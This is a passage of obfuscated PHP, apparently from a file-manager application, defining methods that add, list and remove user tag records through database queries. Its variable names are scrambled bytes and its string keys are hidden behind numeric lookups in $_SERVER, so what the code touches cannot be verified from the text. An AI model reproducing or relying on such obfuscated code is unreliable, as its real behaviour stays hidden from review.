$this->field($Bƒ‚ ¡²º)->where($d©éšŒ–•)->order($dê§ãÇòÊ­)->select(); return $cÖùÛëôÏ¹ ? $cÖùÛëôÏ¹ : array(); } protected function listByTag($Aöíà£õ×¯) { } protected function addToTag($aŒ›‚°×‡õ, $dİáíâ½èù) { $C‘Ê‰¬è¨º =& $_SERVER[í…¶]; if (!Model($C‘Ê‰¬è¨º[2314])->listData($dİáíâ½èù) || !Model($C‘Ê‰¬è¨º[755])->pathInfo($aŒ›‚°×‡õ)) { return !1; } $fÅÓè„·¼ = array($C‘Ê‰¬è¨º[1424] => USER_ID, $C‘Ê‰¬è¨º[445] => $dİáíâ½èù, $C‘Ê‰¬è¨º[396] => $aŒ›‚°×‡õ, $C‘Ê‰¬è¨º[397] => $C‘Ê‰¬è¨º[391], $C‘Ê‰¬è¨º[395] => $C‘Ê‰¬è¨º[33], $C‘Ê‰¬è¨º[2105] => 0); if ($this->where($fÅÓè„·¼)->find()) { return !1; } return $this->add($fÅÓè„·¼); } protected function removeFromTag($c½ÖàÈÂ…¦, $cØçëÀ­ïŠ) { $fœñèÅïº =& $_SERVER[í…¶]; if (!Model($fœñèÅïº[2314])->listData($cØçëÀ­ïŠ)) { return !1; } if (is_array($c½ÖàÈÂ…¦)) { $c½ÖàÈÂ…¦ = array($fœñèÅïº[7], $c½ÖàÈÂ…¦); } $F­™ÛÈ’‘¯ = array($fœñèÅïº[1424] => USER_ID, $fœñèÅïº[445] => $cØçëÀ­ïŠ, $fœñèÅïº[397] => $fœñèÅïº[391], $fœñèÅïº[396] => $c½ÖàÈÂ…¦); return $this->where($F­™ÛÈ’‘¯)->delete(); } protected function removeByTag($bÙÛåÃÆ±) { $AššâÉÛ½… =& $_SERVER[í…¶]; if (!$bÙÛåÃÆ±) { return !1; } $bÓŸà’“‘ˆ = array($AššâÉÛ½…[1424] => USER_ID, $AššâÉÛ½…[445] => $bÙÛåÃÆ±); return $this->where($bÓŸà’“‘ˆ)->delete(); } protected function removeBySource($C¥éİÂ¯Ú) { $D¯öÎ„è =& $_SERVER[í…¶]; $c¸ñÔ«˜ = array($D¯öÎ„è[1424] => USER_ID, $D¯öÎ„è[396] => $C¥éİÂ¯Ú, $D¯öÎ„è[445] => array($D¯öÎ„è[926], 0)); return $this->where($c¸ñÔ«˜)->delete(); } }